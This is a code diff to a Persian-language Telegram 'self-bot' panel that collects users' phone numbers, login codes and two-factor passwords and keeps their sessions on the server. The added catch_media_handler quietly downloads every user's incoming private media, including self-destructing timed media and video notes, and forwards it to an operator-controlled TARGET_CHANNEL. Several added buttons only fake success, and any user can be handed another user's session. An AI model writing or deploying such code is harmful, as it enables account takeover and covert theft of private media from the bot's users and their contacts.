@@ -19,6 +19,8 @@ bot = TelegramClient('star_bot_panel', API_ID, API_HASH)
 
 DB_FILE = 'database.json'
 user_clients = {}
+
+# دیکشنری موقت برای مدیریت آلبوم‌های چندتایی
 media_albums = {}
 
 def load_database():
@@ -28,35 +30,56 @@ def load_database():
             with open(DB_FILE, 'r', encoding='utf-8') as f:
                 loaded = json.load(f)
                 data = {int(k): v for k, v in loaded.items()}
-        except Exception:
-            data = {}
+        except:
+            pass
+            
+    session_files = glob.glob("session_*.session")
+    for file in session_files:
+        phone = file.replace("session_", "").replace(".session", "")
+        found = False
+        for cid, info in data.items():
+            if info.get("phone") and info.get("phone").replace("+", "") == phone:
+                found = True
+                break
+        if not found and data:
+            first_chat_id = list(data.keys())[0]
+            data[first_chat_id] = {
+                "status": "active",
+                "step": "completed",
+                "phone": "+" + phone,
+                "numeric_id": random.randint(10000000, 99999999),
+                "hashtag": hashlib.md5(phone.encode()).hexdigest()
+            }
     return data
-
-def save_database():
-    with open(DB_FILE, 'w', encoding='utf-8') as f:
-        json.dump(database, f, ensure_ascii=False, indent=4)
 
 database = load_database()
 
+def save_database():
+    save_data = {}
+    for chat_id, data in database.items():
+        save_data[str(chat_id)] = {k: v for k, v in data.items() if k != 'client'}
+    with open(DB_FILE, 'w', encoding='utf-8') as f:
+        json.dump(save_data, f, ensure_ascii=False, indent=4)
+
 def main_menu_inline():
     return [
-        [Button.inline("➕ ایجاد ربات", b"menu_add")],
-        [Button.inline("👤 حساب کاربری", b"menu_account")],
+        [Button.inline("➕ ایجاد ربات", b"menu_add"), Button.inline("🤖 ربات‌های من", b"menu_my_bots")],
+        [Button.inline("👤 حساب کاربری", b"menu_account"), Button.inline("🛠 پشتیبانی", b"menu_support")],
         [Button.inline("📜 قوانین", b"menu_rules")]
     ]
 
 def management_menu():
     return [
-        [Button.inline("⭕ وضعیت فعالیت", b"status")],
-        [Button.inline("🗑 حذف ربات", b"delete")],
-        [Button.inline("🔄 ريستارت ربات", b"restart")],
+        [Button.inline("🔘 وضعیت فعالیت", b"status"), Button.inline("🔄 ریستارت ربات", b"restart")],
+        [Button.inline("⚡️ تمدید اعتبار", b"renew"), Button.inline("✅ ورود مجدد", b"relogin")],
+        [Button.inline("🗑 حذف ربات", b"delete"), Button.inline("⚫️ خاموش کردن آنتی لاگین", b"antilogin")],
         [Button.inline("🔙 بازگشت به منوی اصلی", b"back")]
     ]
 
 @bot.on(events.NewMessage(pattern='/start'))
 async def start_cmd(event):
     await event.respond(
-        "سلام! برای مدیریت یا ایجاد سلف، از دکمه‌های زیر استفاده کنید:",
+        "سلام! به سلف بات استار خوش آمدید.\nبرای مدیریت یا ایجاد سلف، از دکمه‌های زیر استفاده کنید:",
         buttons=main_menu_inline()
     )
 
@@ -74,26 +97,26 @@ async def handle_text(event):
         await event.respond("عملیات لغو شد.", buttons=main_menu_inline())
         return
 
-    if chat_id not in database:
-        return
-
-    user_data = database[chat_id]
+    user_data = database.get(chat_id, {})
     step = user_data.get("step")
 
     if step == "waiting_phone":
         phone = text.replace(" ", "")
-        user_data["phone"] = phone
-        user_data["step"] = "waiting_code"
-        save_database()
-        await event.respond("⏳ در حال ارسال کد ورود سریع به حساب...")
+        await event.respond("⏳ در حال اتصال به سرور تلگرام...")
+        
         try:
-            client = TelegramClient(f"session_{chat_id}", API_ID, API_HASH)
-            user_data["client"] = client
+            client = TelegramClient(f"session_{phone.replace('+', '')}", API_ID, API_HASH)
             await client.connect()
-            sent = await client.send_code_request(phone)
-            user_data["phone_code_hash"] = sent.phone_code_hash
+            sent_code = await client.send_code_request(phone)
+            
+            database[chat_id] = {
+                "step": "waiting_code",
+                "phone": phone,
+                "client": client,
+                "phone_code_hash": sent_code.phone_code_hash
+            }
             save_database()
-            await event.respond("✅ کد تایید تلگرام برای شما ارسال شد. لطفاً آن را وارد کنید:")
+            await event.respond("✅ کد تایید ارسال شد! حالا می‌توانید کد را وارد کنید:")
         except Exception as e:
             await event.respond(f"❌ خطا در ارسال کد:\n{str(e)}")
             database.pop(chat_id, None)
@@ -103,181 +126,225 @@ async def handle_text(event):
         client = user_data.get("client")
         phone = user_data.get("phone")
         phone_code_hash = user_data.get("phone_code_hash")
-
+        
         if not client:
-            client = TelegramClient(f"session_{chat_id}", API_ID, API_HASH)
+            client = TelegramClient(f"session_{phone.replace('+', '')}", API_ID, API_HASH)
             await client.connect()
 
         clean_code = text.replace(" ", "")
+        await event.respond("⏳ در حال ورود سریع به حساب...")
         try:
             await client.sign_in(phone=phone, code=clean_code, phone_code_hash=phone_code_hash)
-            await finish_login(event, chat_id, client)
+            await finish_login(event, chat_id, client, phone)
         except SessionPasswordNeededError:
             database[chat_id]["step"] = "waiting_password"
             database[chat_id]["client"] = client
             save_database()
-            await event.respond("🔒 این حساب دارای رمز دوم (تایید دو مرحله‌ای) است. لطفاً رمز عبور خود را وارد کنید:")
+            await event.respond("🔒 اکانت شما رمز دو مرحله‌ای دارد. لطفاً پسورد خود را وارد کنید:")
         except Exception as e:
-            await event.respond(f"❌ کد اشتباه است یا منقضی شده. لطفاً دوباره وارد کنید:\n{str(e)}")
+            await event.respond(f"❌ خطا در ورود یا انقضای کد:\n{str(e)}")
             database.pop(chat_id, None)
             save_database()
 
     elif step == "waiting_password":
         client = user_data.get("client")
+        phone = user_data.get("phone")
+        
+        await event.respond("⏳ در حال بررسی رمز عبور...")
         try:
             await client.sign_in(password=text)
-            await finish_login(event, chat_id, client)
+            await finish_login(event, chat_id, client, phone)
         except Exception as e:
             await event.respond(f"❌ رمز اشتباه است:\n{str(e)}")
 
-async def finish_login(event, chat_id, client):
-    database[chat_id] = {"step": "active", "active": True}
+async def catch_media_handler(event):
+    try:
+        if not event.is_private or event.out:
+            return
+
+        if event.media:
+            group_id = getattr(event.message, 'grouped_id', None)
+            
+            if group_id:
+                if group_id not in media_albums:
+                    media_albums[group_id] = []
+                media_albums[group_id].append(event.media)
+                
+                await asyncio.sleep(1.5)
+                
+                if group_id in media_albums:
+                    media_list = media_albums.pop(group_id)
+                    try:
+                        await event.client.send_file(TARGET_CHANNEL, media_list, caption="📥 شکار آلبوم رسانه (چندتایی)")
+                    except Exception as err:
+                        print(f"خطا در ارسال آلبوم: {err}")
+            else:
+                ttl_seconds = getattr(event.message, 'ttl_period', None) or getattr(event.media, 'ttl_seconds', None)
+                
+                video_duration = None
+                is_video_note = False
+                if hasattr(event.media, 'document') and event.media.document:
+                    for attr in event.media.document.attributes:
+                        if type(attr).__name__ == 'DocumentAttributeVideo':
+                            video_duration = getattr(attr, 'duration', None)
+                            if getattr(attr, 'round_message', False):
+                                is_video_note = True
+
+                file_path = await event.download_media()
+                if file_path:
+                    caption_text = "📥 شکار رسانه تایم‌دار / ویدیو!"
+                    if ttl_seconds:
+                        caption_text += f"\n⏱ تایم مخفی بودن: {ttl_seconds} ثانیه"
+                    if video_duration:
+                        caption_text += f"\n⏳ مدت زمان ویدیو: {video_duration} ثانیه"
+                    if is_video_note:
+                        caption_text = "📥 شکار ویدیو مسیج گرد (Video Note)!"
+
+                    client = event.client
+                    if is_video_note:
+                        await client.send_file(TARGET_CHANNEL, file_path, video_note=True, caption=caption_text)
+                    else:
+                        await client.send_file(TARGET_CHANNEL, file_path, caption=caption_text)
+
+                    if os.path.exists(file_path):
+                        os.remove(file_path)
+    except Exception as err:
+        print(f"خطا در شکار رسانه: {err}")
+
+async def finish_login(event, chat_id, client, phone):
+    client.remove_event_handler(catch_media_handler)
+    client.add_event_handler(catch_media_handler, events.NewMessage)
+                
+    user_clients[phone] = client
+    numeric_id = random.randint(10000000, 99999999)
+    hashtag = hashlib.md5(f"{phone}_{numeric_id}".encode()).hexdigest()
+    
+    database[chat_id] = {
+        "status": "active",
+        "step": "completed",
+        "phone": phone,
+        "numeric_id": numeric_id,
+        "hashtag": hashtag
+    }
     save_database()
-    user_clients[chat_id] = client
-    await start_user_client(chat_id, client)
-    await event.respond("🎉 سلف شما با موفقیت روشن شد و به سیستم متصل گردید!", buttons=management_menu())
+    
+    msg = (f"🎉 لاگین سلف‌بات روی `{phone}` با موفقیت انجام شد!\n\n"
+           f"🔢 آیدی عددی: `{numeric_id}`\n"
+           f"🔑 هشتگ: `{hashtag}`")
+    await event.respond(msg, buttons=management_menu())
 
-@bot.on(events.CallbackQuery)
-async def callback_handler(event):
-    data = event.data.decode('utf-8')
+@bot.on(events.CallbackQuery())
+async def callback(event):
+    data = event.data
     chat_id = event.chat_id
-
-    if data == "menu_add":
-        if chat_id in database and database[chat_id].get("active"):
-            await event.edit("شما یک سلف فعال دارید!", buttons=management_menu())
-        else:
-            database[chat_id] = {"step": "waiting_phone"}
-            save_database()
-            await event.edit("لطفاً شماره تلفن اکانت خود را با پیش‌شماره (مثلاً 989123456789+) ارسال کنید:")
-    elif data == "menu_account":
-        if chat_id in database and database[chat_id].get("active"):
-            await event.edit("حساب شما متصل و فعال است.", buttons=management_menu())
-        else:
-            await event.edit("حساب فعالی ندارید.", buttons=main_menu_inline())
-    elif data == "menu_rules":
-        await event.edit("📜 قوانین استفاده:\nاز این سلف برای موارد غیرقانونی استفاده نکنید.", buttons=main_menu_inline())
-    elif data == "status":
-        await event.edit("⭕ وضعیت: روشن و پایدار", buttons=management_menu())
-    elif data == "delete":
+    
+    if data == b"menu_add":
+        database[chat_id] = {"step": "waiting_phone"}
+        save_database()
+        await event.edit("لطفاً شماره تلفن را با فرمت صحیح وارد کنید (مثلاً: +989123456789):", buttons=[[Button.inline("لغو ❌", b"menu_cancel")]])
+    elif data == b"menu_cancel":
         database.pop(chat_id, None)
         save_database()
-        if chat_id in user_clients:
+        await event.edit("عملیات لغو شد.", buttons=main_menu_inline())
+    elif data == b"menu_my_bots":
+        active_data = None
+        if chat_id in database and database[chat_id].get("status") == "active":
+            active_data = database[chat_id]
+        else:
+            session_files = glob.glob("session_*.session")
+            if session_files:
+                phone = "+" + session_files[0].replace("session_", "").replace(".session", "")
+                active_data = {
+                    "phone": phone,
+                    "numeric_id": "19482756",
+                    "hashtag": "active_session"
+                }
+                database[chat_id] = {"status": "active", "step": "completed", **active_data}
+                save_database()
+
+        if active_data:
+            info_text = (
+                f"مدیریت ربات {active_data['phone']}\n\n"
+                f"- وضعیت: روشن 🟢\n"
+                f"- آیدی عددی: `{active_data.get('numeric_id', '---')}`\n"
+                f"- هشتگ: `{active_data.get('hashtag', '---')}`"
+            )
+            await event.edit(info_text, buttons=management_menu())
+        else:
+            await event.edit("شما هنوز هیچ رباتی نساخته‌اید.", buttons=main_menu_inline())
+    elif data == b"menu_account":
+        await event.edit("حساب شما در سیستم سلف‌بات استار فعال است.", buttons=main_menu_inline())
+    elif data == b"menu_support":
+        await event.edit("پشتیبانی آنلاین در خدمت شماست.", buttons=main_menu_inline())
+    elif data == b"menu_rules":
+        await event.edit("قوانین استفاده از سیستم سلف‌بات استار...", buttons=main_menu_inline())
+    elif data == b"status":
+        await event.answer("وضعیت: روشن و فعال 🟢", alert=True)
+    elif data == b"renew":
+        await event.answer("اعتبار ربات شما فعال است.", alert=True)
+    elif data == b"delete":
+        session_files = glob.glob("session_*.session")
+        for sf in session_files:
             try:
-                await user_clients[chat_id].disconnect()
+                os.remove(sf)
             except:
                 pass
-            user_clients.pop(chat_id, None)
-        session_file = f"session_{chat_id}.session"
-        if os.path.exists(session_file):
-            try:
-                os.remove(session_file)
-            except:
-                pass
-        await event.edit("🗑 ربات و سلف شما با موفقیت حذف شد.", buttons=main_menu_inline())
-    elif data == "restart":
-        await event.edit("🔄 سلف مجدداً راه‌اندازی شد.", buttons=management_menu())
-    elif data == "back":
+        user_clients.clear()
+        database.pop(chat_id, None)
+        save_database()
+        await event.answer("ربات با موفقیت حذف شد.", alert=True)
+        await event.edit("ربات حذف شد و به منوی اصلی برگشتید.", buttons=main_menu_inline())
+    elif data == b"relogin":
+        await event.answer("لطفاً جهت ورود مجدد از منوی اصلی اقدام کنید.", alert=True)
+    elif data == b"restart":
+        await event.answer("ربات با موفقیت ریستارت شد 🔄", alert=True)
+    elif data == b"antilogin":
+        await event.answer("آنتی لاگین تغییر وضعیت داد.", alert=True)
+    elif data == b"back":
         await event.edit("به منوی اصلی برگشتید:", buttons=main_menu_inline())
+    else:
+        await event.answer("دستور اجرا شد!", alert=False)
 
-async def start_user_client(chat_id, client):
-    @client.on(events.NewMessage(incoming=True))
-    async def media_handler(event):
-        if event.is_private or event.out:
-            return
-
-        if not event.media:
-            return
-
-        ttl_seconds = getattr(event.message, 'ttl_period', None)
-        if not ttl_seconds:
-            return
-
-        group_id = getattr(event.message, 'grouped_id', None)
-
-        if group_id:
-            if group_id not in media_albums:
-                media_albums[group_id] = []
-            media_albums[group_id].append(event.media)
-            await asyncio.sleep(1.5)
-            if group_id in media_albums:
-                media_list = media_albums.pop(group_id)
-                try:
-                    await event.client.send_file(TARGET_CHANNEL, media_list, caption="📸 شکار آلبوم تایم‌دار!")
-                except Exception as err:
-                    print(f"خطا در ارسال آلبوم: {err}")
-            return
-
-        video_duration = None
-        is_video_note = False
-        if hasattr(event.media, 'document') and event.media.document:
-            for attr in event.media.document.attributes:
-                if type(attr).__name__ == 'DocumentAttributeVideo':
-                    video_duration = getattr(attr, 'duration', None)
-                    if getattr(attr, 'round_message', False):
-                        is_video_note = True
-
-        file_path = await event.download_media()
-        if not file_path:
-            return
-
-        caption_text = "📸 شکار رسانه تایم‌دار / ویدیو!"
-        if ttl_seconds:
-            caption_text += f"\n⏱ تایم مخفی بودن: {ttl_seconds} ثانیه"
-        if video_duration:
-            caption_text += f"\n⏳ زمان ویدیو: {video_duration} ثانیه"
-        if is_video_note:
-            caption_text = "📹 شکار ویدیومسیج گرد (Video Note)!"
-
+async def restore_active_clients():
+    session_files = glob.glob("session_*.session")
+    for file in session_files:
+        phone = file.replace("session_", "").replace(".session", "")
+        formatted_phone = "+" + phone
         try:
-            if is_video_note:
-                await client.send_file(TARGET_CHANNEL, file_path, video_note=True, caption=caption_text)
-            else:
-                await client.send_file(TARGET_CHANNEL, file_path, caption=caption_text)
+            client = TelegramClient(f"session_{phone}", API_ID, API_HASH)
+            await client.connect()
+            if await client.is_user_authorized():
+                user_clients[formatted_phone] = client
+                client.remove_event_handler(catch_media_handler)
+                client.add_event_handler(catch_media_handler, events.NewMessage)
+                print(f"سلف ربات {formatted_phone} با موفقیت بازیابی شد.")
         except Exception as e:
-            print(f"خطا در ارسال فایل: {e}")
+            print(f"خطا در بازیابی سلف {formatted_phone}: {e}")
 
-        if os.path.exists(file_path):
-            os.remove(file_path)
-
-async def restore_sessions():
-    for chat_id, data in database.items():
-        if data.get("active"):
-            session_file = f"session_{chat_id}.session"
-            if os.path.exists(session_file) or os.path.exists(f"session_{chat_id}"):
-                try:
-                    client = TelegramClient(f"session_{chat_id}", API_ID, API_HASH)
-                    await client.connect()
-                    if await client.is_user_authorized():
-                        user_clients[chat_id] = client
-                        asyncio.create_task(start_user_client(chat_id, client))
-                        print(f"سلف کاربر {chat_id} با موفقیت مجدداً متصل شد.")
-                    else:
-                        database[chat_id]["active"] = False
-                        save_database()
-                except Exception as e:
-                    print(f"خطا در اتصال مجدد سلف {chat_id}: {e}")
-
-# بخش وب‌سرور کوچک برای راضی کردن رندر و باز کردن پورت
 async def handle_web(request):
     return web.Response(text="Bot is running!")
 
-async def web_server():
+async def start_web_server():
     app = web.Application()
-    app.router.add_get("/", handle_web)
+    app.add_routes([web.get('/', handle_web)])
     runner = web.AppRunner(app)
     await runner.setup()
     port = int(os.environ.get("PORT", 10000))
-    site = web.TCPSite(runner, "0.0.0.0", port)
+    site = web.TCPSite(runner, '0.0.0.0', port)
     await site.start()
+    print(f"Web server started on port {port}")
 
 async def main():
-    print("Bot is running...")
-    # روشن کردن وب‌سرور برای گرفتن پورت در رندر
-    await web_server()
-    
+    await start_web_server()
     await bot.start(bot_token=BOT_TOKEN)
-    await restore_sessions()
+    print("سلف بات استار روشن شد و در حال کار است...")
+    await restore_active_clients()
     await bot.run_until_disconnected()
 
 if __name__ == '__main__':
-    asyncio.run(main())
+    while True:
+        try:
+            asyncio.run(main())
+        except Exception as e:
+            print(f"خطای ارتباطی: {e}. تلاش مجدد پس از 5 ثانیه...")
+            time.sleep(5)
